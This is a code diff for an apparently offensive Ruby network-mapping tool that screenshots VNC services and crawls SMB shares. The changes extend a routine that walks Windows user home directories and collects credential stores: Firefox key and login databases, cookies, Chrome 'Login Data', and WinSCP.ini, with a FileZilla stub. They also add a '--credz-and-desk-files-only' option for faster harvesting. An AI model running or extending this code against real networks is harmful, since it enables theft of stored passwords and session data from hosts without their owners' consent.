@@ -187,7 +187,7 @@ class Screenshot < Generic
       ip   = t[1]
       port = t[2]
 
-      output = "screenshot_vnc_#{ip}:#{port}.png"
+      output = "#{opts[:output]}/screenshot_vnc_#{ip}:#{port}.png"
       system("/home/gul/work/tools/web/vncsnapshot/bin/vncsnapshot -quiet #{ip}:#{port} #{output}")
 
       insert_service_values(:id     => get_service_id(:host => ip, :port => port),
@@ -257,7 +257,7 @@ class Smb < Generic
                                       :source => "netbios-map",
                                       :title  => "netbios-share",
                                       :data   => s,
-                                    })
+                                    }) unless id.nil?
             end
           end
         end
@@ -311,8 +311,11 @@ class Smb < Generic
                               :username  => opts[:username],
                               :password  => opts[:password],
                               :workgroup => opts[:workgroup])
-        ### ifiles = smbhost.list_files("smb://#{ip}/#{share}/")
-        ### print_info "Found #{ifiles.length} files !"
+
+        unless not opts[:credzonly].nil? and opts[:credzonly] == true
+          ifiles = smbhost.list_files("smb://#{ip}/#{share}/")
+          # puts "#{ifiles.length}"
+        end
 
         users_home = smbhost.get_users_home_dir("smb://#{ip}/#{share}/")
         unless users_home.nil?
@@ -410,9 +413,9 @@ class SmbHost
 
     files = []
 
-    smbdir = @conn.opendir(path)
-
     begin
+
+      smbdir = @conn.opendir(path)
 
       while dent = smbdir.read
         next if dent.name.to_s == "." or dent.name.to_s == ".."
@@ -426,7 +429,6 @@ class SmbHost
         # puts "File: " + path + dent.name.to_s
         # elsif dent.dir? and not dent.link?
         if dent.dir? and not dent.link?
-          # puts "Dir:  " + path + dent.name.to_s
           files = files + list_files(path + dent.name.to_s + "/")
         end
       end
@@ -461,27 +463,37 @@ class SmbHost
   def get_users_home_dir(path)
 
     home_dir = []
-    user_dir = nil
+    user_dir = []
     print_debug "$HOME: #{path}"
     share = @conn.opendir(path)
 
     while dent = share.read
-      if dent.name.to_s == "Documents and Settings" or
-          dent.name.to_s == "Users"
+      if  dent.name.to_s == "Users" or
+          dent.name.to_s == "Documents and Settings"
         user_dir = dent.name.to_s
-        break
+
+        print_debug "User dir => #{user_dir}"
+
+        begin
+
+          @conn.opendir("#{path}/#{user_dir}") do |user_dir_path|
+
+            while dent = user_dir_path.read
+              next if dent.name.to_s == "." or dent.name.to_s == ".."
+              home_dir << "#{path}/#{user_dir}/#{dent.name}"
+              print_debug "Found: " + "#{path}/#{user_dir}/#{dent.name}"
+            end
+
+          end
+
+        rescue Exception => e
+          print_debug "#{e}"
+        end
+
       end
     end
 
-    return if user_dir.nil?
-    print_debug "User dir => #{user_dir}"
-
-    user_dir_path = @conn.opendir("#{path}/#{user_dir}")
-    while dent = user_dir_path.read
-      next if dent.name.to_s == "." or dent.name.to_s == ".."
-      home_dir << "#{path}/#{user_dir}/#{dent.name}"
-      print_debug "Found: " + "#{path}/#{user_dir}/#{dent.name}"
-    end
+    # return if user_dir.nil?
 
     home_dir
 
@@ -520,9 +532,15 @@ class SmbHost
 
         profile = @conn.opendir("#{appdata}/Mozilla/Firefox/Profiles/#{dent.name}")
         while ddent = profile.read
-          # key3.db|signons.sqlite|bookmarks.html|places.sqlite|cookies.sqlite
-          if  ddent.name.to_s == "key3.db" or
-              ddent.name.to_s == "signons.sqlite"
+          if [ "key3.db",
+               "signons.sqlite",
+               "logins.json",
+               "bookmarks.html",
+               "places.sqlite",
+               "cookies.sqlite",
+               "cert8.db" ].include? ddent.name.to_s
+          # if  ddent.name.to_s == "key3.db" or
+          #     ddent.name.to_s == "signons.sqlite"
             credz << "#{appdata}/Mozilla/Firefox/Profiles/#{dent.name}/#{ddent.name}"
             print_info "Found: #{appdata}/Mozilla/Firefox/Profiles/#{dent.name}/#{ddent.name}"
           end
@@ -534,8 +552,8 @@ class SmbHost
     # Chrome
     begin
 
-      if    path.to_s.include? "Documents and Settings"
-        appdata = "#{path}/Local Settings/pplication Data"
+      if path.to_s.include? "Documents and Settings"
+        appdata = "#{path}/Local Settings/Application Data"
       elsif path.to_s.include? "Users"
         appdata = "#{path}/AppData/Local"
       end
@@ -546,11 +564,49 @@ class SmbHost
         next if dent.name.to_s == "." or dent.name.to_s == ".."
 
         if  dent.name.to_s == "Web Data" or
-            dent.name.to_s == "Logi Data"
+            dent.name.to_s == "Login Data"
           credz << "#{appdata}/Google/Chrome/User Data/Default/#{dent.name}"
           print_info "Found: #{appdata}/Google/Chrome/User Data/Default/#{dent.name}"
         end
       end
+
+    rescue
+    end
+
+    # WinSCP
+    begin
+
+      if path.to_s.include? "Documents and Settings"
+        appdata = "#{path}/Local Settings/Application Data"
+      elsif path.to_s.include? "Users"
+        appdata = "#{path}/AppData/Roaming"
+      end
+      raise if appdata.nil?
+
+      profiles = @conn.opendir("#{appdata}")
+      while dent = profiles.read
+        next if dent.name.to_s == "." or dent.name.to_s == ".."
+
+        if  dent.name.to_s == "WinSCP.ini"
+          credz << "#{appdata}/#{dent.name}"
+          print_info "Found: #{appdata}/#{dent.name}"
+        end
+      end
+
+    rescue
+    end
+
+    # FileZilla
+    begin
+
+      if path.to_s.include? "Documents and Settings"
+        appdata = "#{path}/Local Settings/Application Data"
+      elsif path.to_s.include? "Users"
+        appdata = "#{path}/AppData/Roaming"
+      end
+      raise if appdata.nil?
+
+      ##     Roaming\FileZilla
 
     rescue
     end
@@ -586,6 +642,10 @@ if $0 == __FILE__
     options[:targets] = urls.split(",")
   end
 
+  opts.on("--credz-and-desk-files-only", "Useful if you want to only get the credz and Desktop files out of a SMB share. Will be way faster") do
+    options[:credzonly] = true
+  end
+
   opts.on("-U", "--username USERNAME") do |username|
     options[:username] = username
   end
@@ -619,10 +679,16 @@ if $0 == __FILE__
   opts.parse!
 
   if options[:actions].length == 0
-    # options[:actions] << Gul::Map::Screenshot
+    options[:actions] << Gul::Map::Screenshot
     options[:actions] << Gul::Map::Smb
   end
 
+  if options[:actions].include? Gul::Map::Smb and not options[:credzonly] == true
+    print_info "ARE YOU SURE YOU DO NOT WANT TO USE THE --credz-and-desk-files-only option ?"
+    print_info "It will take ages, you got 5 sec to cancel !"
+    5.times { print "." ; sleep 1}
+    puts
+  end
 
   ARGV.each do |sqlfile|
     puts "Processing #{sqlfile}"
